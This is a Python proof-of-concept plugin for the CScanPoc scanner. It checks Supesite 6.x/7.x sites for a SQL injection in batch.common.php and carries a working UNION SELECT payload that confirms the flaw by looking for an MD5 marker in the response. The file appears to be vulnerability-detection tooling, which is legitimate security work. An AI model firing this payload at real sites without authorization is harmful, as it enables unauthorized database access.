# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2


class Vuln(ABVuln):
    vuln_id = 'Supesite_0002'  # 平台漏洞编号，留空
    name = 'Supesite 6.x 7.x SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-16'  # 漏洞公布时间
    desc = '''
        batch.common.php (218) :
        $name = empty($_GET['name'])?'':trim($_GET['name']); //无过滤
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/2303/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Supesite'  # 漏洞应用名称
    product_version = '6.x 7.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '99cc7ad1-2655-47e2-b35e-829b8ab06786'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-21'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/batch.common.php?action=modelquote&cid=1&name=spacecomments%20where%201=2%20union%20select%201,2,3,4,5,concat(0x7e,md5(c),0x7e,0x5430304C5320474F21,0x7e),7,8,9,10,11,12,13,14,15,16,17,18,19,20,21%23"
            url = self.target + payload
            r = requests.get(url)

            if "4a8a08f09d37b73795649038408b5f33" in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
